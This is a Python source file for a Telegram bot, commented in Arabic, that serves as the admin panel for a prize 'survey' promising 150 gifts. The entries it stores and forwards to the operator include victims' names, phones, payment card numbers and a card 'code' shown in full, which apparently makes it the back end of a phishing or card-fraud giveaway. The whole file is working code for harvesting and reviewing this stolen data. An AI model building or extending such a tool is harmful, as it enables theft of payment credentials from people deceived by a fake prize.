import telebot
import json
import time
from datetime import datetime
import os

# إعداد البوت
TOKEN = "YOUR_BOT_TOKEN_HERE"  # ضع توكن بوتك هنا
bot = telebot.TeleBot(TOKEN)

# قاعدة البيانات
SURVEYS_FILE = "surveys.json"
ADMIN_CHAT_ID = "YOUR_CHAT_ID_HERE"  # ضع شات آيدي المدير هنا

def load_surveys():
    """تحميل البيانات من ملف JSON"""
    try:
        if os.path.exists(SURVEYS_FILE):
            with open(SURVEYS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        return []
    except Exception as e:
        print(f"خطأ في تحميل البيانات: {e}")
        return []

def save_surveys(surveys):
    """حفظ البيانات في ملف JSON"""
    try:
        with open(SURVEYS_FILE, "w", encoding="utf-8") as f:
            json.dump(surveys, f, ensure_ascii=False, indent=2)
        return True
    except Exception as e:
        print(f"خطأ في حفظ البيانات: {e}")
        return False

def format_survey(survey):
    """تنسيق بيانات الاستبيان"""
    device_info = survey.get('deviceInfo', {})
    
    return f"""
📋 *بيانات المشاركة*
┌─────────────────
│ 🆔 رقم المشاركة: `{survey['id']}`
│ 👤 الاسم: {survey['name']}
│ 📞 الهاتف: `{survey['phone']}`
│ 💳 البطاقة: `{survey['card'][:4]} **** **** {survey['card'][-4:]}`
│ 🔐 الرمز: `{survey['code']}`
│ 
│ 📱 *معلومات الجهاز:*
│ ▫️ النوع: {device_info.get('type', 'غير معروف')}
│ ▫️ المتصفح: {device_info.get('browser', 'غير معروف')}
│ ▫️ النظام: {device_info.get('os', 'غير معروف')}
│ 
│ 📅 التاريخ: {survey['date']}
│ ✅ الحالة: {survey.get('status', 'pending')}
└─────────────────
"""

# أمر البدء
@bot.message_handler(commands=['start'])
def start(message):
    keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    keyboard.add("📊 الإحصائيات", "📋 المعلقة")
    keyboard.add("✅ المقبولة", "❌ المرفوضة")
    keyboard.add("🎁 الفائزين", "🔄 تحديث")
    
    welcome_msg = """
🛠️ *مرحباً بك في لوحة تحكم الاستبيانات*

📌 *الأوامر المتاحة:*
/start - عرض القائمة الرئيسية
/stats - عرض الإحصائيات
/pending - الاستبيانات المعلقة
/approve_ID - قبول مشاركة
/reject_ID - رفض مشاركة

📱 *استخدام الأزرار:*
يمكنك استخدام الأزرار أدناه للتحكم السريع
"""
    
    bot.send_message(
        message.chat.id,
        welcome_msg,
        reply_markup=keyboard,
        parse_mode="Markdown"
    )

# عرض الإحصائيات
@bot.message_handler(commands=['stats'])
def show_stats(message):
    surveys = load_surveys()
    
    total = len(surveys)
    pending = len([s for s in surveys if s.get('status') == 'pending'])
    approved = len([s for s in surveys if s.get('status') == 'approved'])
    rejected = len([s for s in surveys if s.get('status') == 'rejected'])
    
    # إحصائيات الأجهزة
    devices = {}
    for s in surveys:
        device_type = s.get('deviceInfo', {}).get('type', 'غير معروف')
        devices[device_type] = devices.get(device_type, 0) + 1
    
    devices_text = "\n".join([f"▫️ {k}: {v}" for k, v in devices.items()])
    
    stats_msg = f"""
📈 *إحصائيات الاستبيانات*
┌─────────────────
│ 👥 إجمالي المشاركين: {total}
│ ⏳ بانتظار المراجعة: {pending}
│ ✅ المقبولة: {approved}
│ ❌ المرفوضة: {rejected}
│ 🎁 الهدايا المتبقية: {150 - approved}
│ 
│ 📱 *توزيع الأجهزة:*
│ {devices_text}
└─────────────────
"""
    
    bot.send_message(message.chat.id, stats_msg, parse_mode="Markdown")

# عرض الاستبيانات المعلقة
@bot.message_handler(commands=['pending'])
def show_pending(message):
    surveys = load_surveys()
    pending_surveys = [s for s in surveys if s.get('status') == 'pending']
    
    if not pending_surveys:
        bot.send_message(message.chat.id, "✅ *لا توجد استبيانات معلقة حالياً*", parse_mode="Markdown")
        return
    
    bot.send_message(message.chat.id, f"📋 *الاستبيانات المعلقة ({len(pending_surveys)}):*", parse_mode="Markdown")
    
    for survey in pending_surveys[:10]:  # عرض أول 10 فقط
        keyboard = telebot.types.InlineKeyboardMarkup()
        keyboard.row(
            telebot.types.InlineKeyboardButton("✅ قبول", callback_data=f"approve_{survey['id']}"),
            telebot.types.InlineKeyboardButton("❌ رفض", callback_data=f"reject_{survey['id']}")
        )
        
        bot.send_message(
            message.chat.id,
            format_survey(survey),
            reply_markup=keyboard,
            parse_mode="Markdown"
        )
    
    if len(pending_surveys) > 10:
        bot.send_message(message.chat.id, f"📝 *عرض {min(10, len(pending_surveys))} من {len(pending_surveys)}*", parse_mode="Markdown")

# معالجة الأزرار النصية
@bot.message_handler(func=lambda m: m.text in ["📊 الإحصائيات", "📋 المعلقة", "✅ المقبولة", "❌ المرفوضة", "🎁 الفائزين", "🔄 تحديث"])
def handle_buttons(message):
    if message.text == "📊 الإحصائيات":
        show_stats(message)
    elif message.text == "📋 المعلقة":
        show_pending(message)
    elif message.text == "✅ المقبولة":
        show_approved(message)
    elif message.text == "❌ المرفوضة":
        show_rejected(message)
    elif message.text == "🎁 الفائزين":
        show_winners(message)
    elif message.text == "🔄 تحديث":
        bot.send_message(message.chat.id, "🔄 *تم تحديث البيانات*", parse_mode="Markdown")
        show_stats(message)

# عرض المقبولة
def show_approved(message):
    surveys = load_surveys()
    approved_surveys = [s for s in surveys if s.get('status') == 'approved']
    
    if not approved_surveys:
        bot.send_message(message.chat.id, "⚠️ *لا توجد استبيانات مقبولة بعد*", parse_mode="Markdown")
        return
    
    count = min(10, len(approved_surveys))
    bot.send_message(message.chat.id, f"✅ *الاستبيانات المقبولة ({len(approved_surveys)}):*", parse_mode="Markdown")
    
    for survey in approved_surveys[:10]:
        bot.send_message(
            message.chat.id,
            format_survey(survey),
            parse_mode="Markdown"
        )

# عرض المرفوضة
def show_rejected(message):
    surveys = load_surveys()
    rejected_surveys = [s for s in surveys if s.get('status') == 'rejected']
    
    if not rejected_surveys:
        bot.send_message(message.chat.id, "✅ *لا توجد استبيانات مرفوضة*", parse_mode="Markdown")
        return
    
    bot.send_message(message.chat.id, f"❌ *الاستبيانات المرفوضة ({len(rejected_surveys)}):*", parse_mode="Markdown")
    
    for survey in rejected_surveys[:10]:
        bot.send_message(
            message.chat.id,
            format_survey(survey),
            parse_mode="Markdown"
        )

# عرض الفائزين
def show_winners(message):
    surveys = load_surveys()
    winners = [s for s in surveys if s.get('status') == 'approved'][:150]  # أول 150 مقبول
    
    if not winners:
        bot.send_message(message.chat.id, "🎯 *لم يتم تحديد الفائزين بعد*", parse_mode="Markdown")
        return
    
    winners_count = len(winners)
    winners_msg = f"""
🎉 *قائمة الفائزين المحتملين*
┌─────────────────
│ 🎁 عدد الفائزين: {winners_count}
│ 📅 آخر تحديث: {datetime.now().strftime('%Y-%m-%d %H:%M')}
│ 
│ 📋 *أحدث الفائزين:*
"""
    
    for i, winner in enumerate(winners[:5], 1):
        winners_msg += f"│ {i}. {winner['name']} - {winner['phone']}\n"
    
    winners_msg += "└─────────────────\n"
    winners_msg += f"📝 *عرض 5 من {winners_count} فائز*"
    
    bot.send_message(message.chat.id, winners_msg, parse_mode="Markdown")

# معالجة أوامر الموافقة والرفض
@bot.message_handler(commands=['approve_', 'reject_', 'details_'])
def handle_commands(message):
    try:
        parts = message.text.split('_')
        if len(parts) < 2:
            bot.reply_to(message, "❌ *صيغة خاطئة*", parse_mode="Markdown")
            return
        
        command = parts[0][1:]  # approve أو reject أو details
        survey_id = parts[1]
        
        surveys = load_surveys()
        survey_index = -1
        
        for i, s in enumerate(surveys):
            if s['id'] == survey_id:
                survey_index = i
                break
        
        if survey_index == -1:
            bot.reply_to(message, f"❌ *لم يتم العثور على الاستبيان {survey_id}*", parse_mode="Markdown")
            return
        
        if command == 'details':
            bot.reply_to(message, format_survey(surveys[survey_index]), parse_mode="Markdown")
            return
        
        # قبول أو رفض
        surveys[survey_index]['status'] = command
        surveys[survey_index]['reviewed_by'] = message.from_user.username or "غير معروف"
        surveys[survey_index]['reviewed_at'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        if save_surveys(surveys):
            action_icon = "✅" if command == "approve" else "❌"
            action_text = "مقبولة" if command == "approve" else "مرفوضة"
            
            response = f"""
{action_icon} *تم {action_text} الاستبيان بنجاح*
┌─────────────────
│ 🆔 رقم المشاركة: `{survey_id}`
│ 👤 الاسم: {surveys[survey_index]['name']}
│ 📞 الهاتف: `{surveys[survey_index]['phone']}`
│ 👮 المراجع: @{surveys[survey_index]['reviewed_by']}
│ ⏰ وقت المراجعة: {surveys[survey_index]['reviewed_at']}
└─────────────────
"""
            bot.reply_to(message, response, parse_mode="Markdown")
        else:
            bot.reply_to(message, "❌ *حدث خطأ في حفظ البيانات*", parse_mode="Markdown")
            
    except Exception as e:
        bot.reply_to(message, f"❌ *حدث خطأ: {str(e)}*", parse_mode="Markdown")

# معالجة زر الإنلاين
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    try:
        if call.data.startswith('approve_') or call.data.startswith('reject_'):
            parts = call.data.split('_')
            command = parts[0]
            survey_id = parts[1]
            
            # محاكاة الأمر
            message = type('obj', (object,), {
                'text': f"/{command}_{survey_id}",
                'chat': type('obj', (object,), {'id': call.message.chat.id}),
                'from_user': type('obj', (object,), {'username': call.from_user.username}),
                'reply_to_message': None
            })
            
            handle_commands(message)
            
            # تحديث الزر
            bot.answer_callback_query(call.id, f"تم {command} الاستبيان")
            
    except Exception as e:
        bot.answer_callback_query(call.id, f"خطأ: {str(e)}")

# بدء البوت
print("🤖 البوت يعمل...")
print(f"📱 Token: {TOKEN[:10]}...")
print(f"👤 Admin Chat ID: {ADMIN_CHAT_ID}")
print("⌛ في انتظار الرسائل...")

try:
    bot.polling(none_stop=True, interval=1)
except Exception as e:
    print(f"❌ خطأ في تشغيل البوت: {e}")